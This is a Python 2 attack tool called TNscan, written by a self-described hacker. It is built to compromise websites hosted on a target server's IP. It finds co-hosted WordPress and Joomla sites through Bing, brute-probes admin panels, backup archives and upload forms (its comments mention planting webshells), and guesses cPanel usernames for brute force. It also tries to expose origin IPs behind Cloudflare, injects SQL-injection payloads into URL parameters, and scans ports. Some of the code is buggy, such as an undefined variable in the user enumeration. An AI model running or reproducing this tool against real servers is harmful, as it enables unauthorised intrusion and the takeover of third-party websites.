#!/usr/bin/env python2
# >>> Bism Allah <<<
# Code Name : TNscan v1.0
# Coder     : MatriX Coder (17 yo guy from Tunisia)
# Blog      : www.matrixcoder.co.vu  
# Twitter   : MatriX_Coder
# Pastebin  : www.pastebin.com/u/matrixcoder
# this a developed version of al-swisre code (well i think it's even better) anyway greats to that man
# Greats to : all Muslim (ethical and unethical) Hackers who are fighting for an issue
#              greats also to tunisia fallega team and to madleets team and to you !
# Wroten with <3 in my arch machine using geany, a cup of tea and while listening to jazz
 
import re, urllib2, urllib, os, socket, sys
from platform import system
logo = """
\t _____ _   _                    
\t|_   _| \ | |                    
\t  | | |  \| |___  ___ __ _ _ __  
\t  | | | . ` / __|/ __/ _` | '_ \
\t  | | | |\ \__ \ (_| (_| | | | |
\t  \_/ \_| \_/___/\___\__,_|_| |_| v1.0
                                                 
"""
 
menu = """
1) Get all websites
2) Get joomla websites
3) Get wordpress websites
4) Find control panel
5) Find zip files
6) Find upload files
7) Get server users
8) Scan from SQL injection
9) Crawl and scan from SQL injection (soon)
10) Scan ports (range of ports)
11) Scan ports (common ports  )
12) Get server banner
13) Bypass Cloudflare
14) About !
99) Exit
"""
def unique(seq):
        """
        get unique from list found it on stackoverflow
        """
        seen = set()
        return [seen.add(x) or x for x in seq if x not in seen]
       
def clearScr() :
        """
        clear the screen in case of GNU/Linux or
        windows
        """
        if system() == 'Linux':
                os.system('clear')
        if system() == 'Windows':
                os.system('cls')
 
class TNscan :
        def __init__(self, serverip) :
                self.serverip = serverip
                self.getSites(False)
                print menu
                while True :
                        choice = raw_input(' Enter choice -> ')
                        if choice == '1' :
                                self.getSites(True)
                        elif choice == '2' :
                                self.getJoomla()
                        elif choice == '3' :
                                self.getWordpress()
                        elif choice == '4' :
                                self.findPanels()
                        elif choice == '5' :
                                self.findZip()
                        elif choice == '6' :
                                self.findUp()
                        elif choice == '7' :
                                self.getUsers()
                        elif choice == '8' :
                                self.grabSqli()
                        elif choice == '10' :
                                ran = raw_input(' Enter range of ports, (ex : 1-1000) -> ')
                                self.portScanner(1, ran)
                        elif choice == '11' :
                                self.portScanner(2, None)
                        elif choice == '12' :
                                self.getServerBanner()
                        elif choice == '13' :
                                self.cloudflareBypasser()
                        elif choice == '14' :
                                self.aboutME()
                        elif choice == '99' :
                                print ' Goodbye'
                                exit()
                        con = raw_input(' Continue [Y/n] -> ')
                        if con[0].upper() == 'N' :
                                exit()
                        else :
                                clearScr()
                                print logo
                                print menu
               
        def aboutME(self) :
                clearScr()
                print """
>>> Bism Allah <<<
Code Name : TNscan v1.0
Coder     : MatriX Coder (17 yo guy from Tunisia)
Blog      : www.matrixcoder.co.vu  
Twitter   : MatriX_Coder
Pastebin  : www.pastebin.com/u/matrixcoder
this a developed version of al-swisre code (well i think it's even better) anyway greats to that man
Greats to : all Muslim (ethical and unethical) Hackers who are fighting for an issue
        greats also to tunisian fallega team, to madleets team and to you !
Wroten with <3 in my arch machine using geany, a cup of tea and while listening to jazz
"""
       
        def getSites(self, a) :
                """
                get all websites on same server
                from bing search
                """
                lista = []
                page = 1
                while page <= 101:
                        try:
                                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+&count=50&first=" + str(page)
                                openbing = urllib2.urlopen(bing)
                                readbing = openbing.read()
                                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                                for i in range(len(findwebs)):
                                        allnoclean = findwebs[i]
                                        findall1 = re.findall('http://(.*?)/', allnoclean)
                                        for idx, item in enumerate(findall1):
                                                if 'www' not in item:
                                                        findall1[idx] = 'http://www.' + item + '/'
                                                else:
                                                        findall1[idx] = 'http://' + item + '/'
                                        lista.extend(findall1)
                                       
                                page += 50
                        except urllib2.URLError:
                                pass
                self.sites = unique(lista)
                if a :         
                        clearScr()
                        print '[*] Found ', len(lista), ' Website\n'
                        for site in self.sites :
                                print site
                       
        def getWordpress(self) :
                """
                get wordpress site using a dork the attacker
                may do a password list attack (i did a tool for that purpose check my pastebin)
                or scan for common vulnerabilities using wpscan for example (i did a simple tool
                for multi scanning using wpscan)
                """
                lista = []
                page = 1
                while page <= 101:
                        try:
                                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+?page_id=&count=50&first=" + str(page)
                                openbing = urllib2.urlopen(bing)
                                readbing = openbing.read()
                                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                                for i in range(len(findwebs)):
                                        wpnoclean = findwebs[i]
                                        findwp = re.findall('(.*?)\?page_id=', wpnoclean)
                                        lista.extend(findwp)
                                page += 50
                        except:
                                pass
                lista = unique(lista)
                clearScr()
                print '[*] Found ', len(lista), ' Wordpress Website\n'
                for site in lista :
                        print site
 
        def getJoomla(self) :
                """
                get all joomla websites using
                bing search the attacker may bruteforce
                or scan them
                """
                lista = []
                page = 1
                while page <= 101:
                        bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+index.php?option=com&count=50&first=" + str(page)
                        openbing = urllib2.urlopen(bing)
                        readbing = openbing.read()
                        findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                        for i in range(len(findwebs)):
                                jmnoclean = findwebs[i]
                                findjm = re.findall('(.*?)index.php', jmnoclean)
                                lista.extend(findjm)
                        page += 50
                lista = unique(lista)
                clearScr()
                print '[*] Found ', len(lista), ' Joomla Website\n'
                for site in lista :
                        print site
 
               
        def findPanels(self) :
                """
                find panels from grabbed websites
                the attacker may do a lot of vulnerabilty
                tests on the admin area
                """
                adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/', 'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
                clearScr()
                for site in self.sites :
                        for admin in adminList :
                                if urllib.urlopen(site + admin).getcode() == 200 :
                                        print " [*] Found admin panel -> ", site + admin
       
        def findZip(self) :
                """
                find zip files from grabbed websites
                it may contain useful informations
                """
                zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar', 'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
                clearScr()
                for site in self.sites :
                        for zip1 in zipList :
                                if urllib.urlopen(site + zip1).getcode() == 200 :
                                        print " [*] Found zip file -> ", site + zip1
                                       
        def findUp(self) :
                """
                find upload forms from grabbed
                websites the attacker may succeed to
                upload malicious files like webshells
                """
                upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php','blog/up.php', 'upload.php', 'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
                clearScr()
                for site in self.sites :
                        for up in upList :
                                if (urllib.urlopen(site + up).getcode() == 200) :
                                        html = urllib.urlopen(site + up).readlines()
                                        for line in html :
                                                if re.findall('type=file', line) :
                                                        print " [*] Found upload -> ", site+up
                                               
        def getUsers(self) :
                """
                get server users using a method found by
                iranian hackers i think, the attacker may
                do a bruteforce attack on CPanel, ssh, ftp or
                even mysql if it supports remote login
                (you can use medusa or hydra)
                """
                userslist = []
                for site in self.sites :
                        try:
                                site = site.replace('http://www.', '')
                                site = site.replace('http://', '')
                                site = site.replace('.', '')
                                if '-' in site:
                                        site = site.replace('-', '')
                                site = site.replace('/', '')
 
                                while len(site) > 2:
                                        resp = urllib2.urlopen(site + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                                        if 'invalid username' not in resp.lower():
                                                print '\t [*] Found -> ', site
                                                userslist.append(site)
                                        else :
                                                print site
                                               
                                        site = site[:-1]
                                       
                                clearScr()
                                for user in userlist :
                                        print user
 
                        except:
                                pass
                       
        def cloudflareBypasser(self) :
                """
                trys to bypass cloudflare i already wrote
                in my blog how it works, i learned this
                method from a guy in madleets
                """
                clearScr()
                subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
                for site in self.sites :
                        site.replace('http://', '')
                        site.replace('/', '')                  
                        try:
                                ip = socket.gethostbyname(site)
                        except socket.error:
                                pass
                        for sub in subdoms:
                                doo = sub + '.' + site
                                print ' [~] Trying -> ', doo
                                try:
                                        ddd = socket.gethostbyname(doo)
                                        if ddd != ip:
                                                print ' [*] Cloudflare bypassed -> ', ddd
                                                break
                                except socket.error :
                                        pass
                                               
        def getServerBanner(self) :
                """
                simply gets the server banner
                the attacker may benefit from it
                like getting the server side software
                """
                clearScr()
                try:
                        s = 'http://' + self.serverip
                        httpresponse = urllib.urlopen(s)
                        print ' [*] Server header -> ', httpresponse.headers.getheader('server')
                except:
                        pass
                       
        def grabSqli(self) :
                """
                just grabs all websites in server with php?id= dork
                for scanning for error based sql injection
                """
                page = 1
                lista = []
                while page <= 101:
                        try:
                                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+php?id=&count=50&first=" + str(page)
                                openbing = urllib2.urlopen(bing)
                                readbing = openbing.read()
                                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                                for i in range(len(findwebs)):
                                        x = findwebs[i]
                                        lista.append(x)
                        except:
                                pass                   
                        page += 50     
                lista = unique(lista)          
                self.checkSqli(lista)
               
        def checkSqli(self, s):
                """
                checks for error based sql injection,
                most of the codes here are from webpwn3r
                project the one who has found an lfi in
                yahoo as i remember, you can find a separate
                tool in my blog
                """
                clearScr()
                payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
                check = re.compile("Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
                for url in s:
                        try:
                                for param in url.split('?')[1].split('&'):
                                        for payload in payloads:
                                                power = url.replace(param, param + payload.strip())
                                                #print power
                                                html = urllib2.urlopen(power).readlines()
                                                for line in html:
                                                        checker = re.findall(check, line)
                                                        if len(checker) != 0 :
                                                                print ' [*] SQLi found -> ', power
                        except:
                                pass
       
        def crawlSqli(self) :
                """
                simple crawling using chilkat (yeah chilkat sucks)
                and scan for error based sql injection
                [!] will be on the next version
                """
                pass
       
        def portScanner(self, mode, ran) :
                """
                simple port scanner works with range of ports
                or with common ports (al-swisre idea)
                """
                clearScr()
                def do_it(ip, port):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        #sock.settimeout(5)
                        sock = sock.connect_ex((ip,port))
                        if sock == 0:
                                print " [*] Port %i is open" % port
               
                if mode == 1 :
                        a = ran.split('-')
                        start = int(a[0])
                        end = int(a[1])
                        for i in range(start, end):
                                do_it(self.serverip, i)
                elif mode == 2 :
                        for port in [80,21,22,2082,25,53,110,443,143] :
                                # didn't use multithreading cos it's few ports
                                do_it(self.serverip, port)
 
if __name__ == '__main__' :
        try :
                clearScr()
                print logo
                TNscan(sys.argv[1])
        except IndexError :
                print " [*] Usage : python "+sys.argv[0]+" 127.0.0.1"
